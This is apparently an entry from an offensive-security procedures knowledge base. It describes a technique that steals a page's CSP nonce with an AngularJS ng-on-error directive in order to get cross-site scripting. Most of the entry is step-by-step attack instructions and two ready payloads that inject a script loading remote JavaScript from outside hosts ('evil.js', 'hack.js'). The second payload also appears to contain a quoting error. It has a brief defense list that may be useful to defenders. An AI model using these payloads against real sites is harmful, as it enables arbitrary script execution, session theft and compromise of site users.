---
tags:
  - csp-bypass
  - nonce-theft
  - xss
type: procedure
tools:
  - '[[tools/Browser-Developer-Tools]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/steal-nonce-inject-script]]'
  - '[[commands/inject-angularjs-iframe]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:30:07.588Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 9d637641-9a09-45a6-a523-e4d10452937e
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Steal-Nonce-and-Inject-External-Script

## Summary

This procedure exploits Angular directives to steal the CSP nonce from the parent document and apply it to an injected script tag, allowing arbitrary external JavaScript execution and full XSS in a nonce-protected context.

## Description

After loading AngularJS, the ng-on-error directive on an img tag with invalid src triggers an error event, providing access to the document context. From there, query the top document for elements with nonce attributes (e.g., existing script tags), create a new script element with an external src, copy the nonce, and append it to the body. This bypasses CSP nonce enforcement. Applicable to web apps with HTML injection and nonce-based CSP without 'strict-dynamic'. Note: May fail in some browsers due to UA sniffing errors (e.g., Chrome detected as Safari).

## Requirements

1. AngularJS loaded via prior procedure
2. Target page with nonce-enforced CSP
3. Browser dev tools access

## Defense

Defensive measures and detection strategies:

- Use 'strict-dynamic' CSP to block nonce reuse from third-party scripts
- Isolate frames with sandbox attributes to prevent cross-frame DOM access
- Monitor for script creations with copied nonces in client-side logs or CSP reports
- Avoid nonce exposure in queryable elements

## Objectives

1. Capture CSP nonce from parent document
2. Inject and execute external script
3. Achieve persistent XSS

## Instructions

### Step 1: Trigger Nonce Theft via ng-on-error

**Context**: Use the error event to access and query the document for nonce.

**Command** ([[commands/steal-nonce-inject-script]]):
```javascript
<img src=x ng-on-error='w=$event.target.ownerDocument;a=w.defaultView.top.document.querySelector("[nonce]");b=w.createElement("script");b.src="//example.com/evil.js";b.nonce=a.nonce;w.body.appendChild(b)'>
```

> This img tag errors on load, executes the ng-on-error payload to steal nonce and inject script. Expected output: External script loads and runs.

### Step 2: Integrate with Full Payload

**Context**: Combine with iframe injection for complete bypass.

**Command** ([[commands/inject-angularjs-iframe]]):
```javascript
document.getElementsByTagName("div")[0].innerHTML=`<iframe srcdoc="<div lang=en ng-app=application ng-csp class=ng-scope>\n<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>\n<img src=x ng-on-error='w=$event.target.ownerDocument;a=w.defaultView.top.document.querySelector(\"[nonce]\"");b=w.createElement(\"script\");b.src=\"//joaxcar.com/hack.js\";b.nonce=a.nonce;w.body.appendChild(b)'>\n</div>\n">`
```

> Full injection including Angular load and nonce theft. Expected output: hack.js fetched in network tab, payload executes.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/steal-nonce-inject-script]]
- [[commands/inject-angularjs-iframe]]

## Tools Used

- [[tools/Browser-Developer-Tools]]

## Tags

- [[csp-bypass]]
- [[nonce-theft]]
- [[xss]]
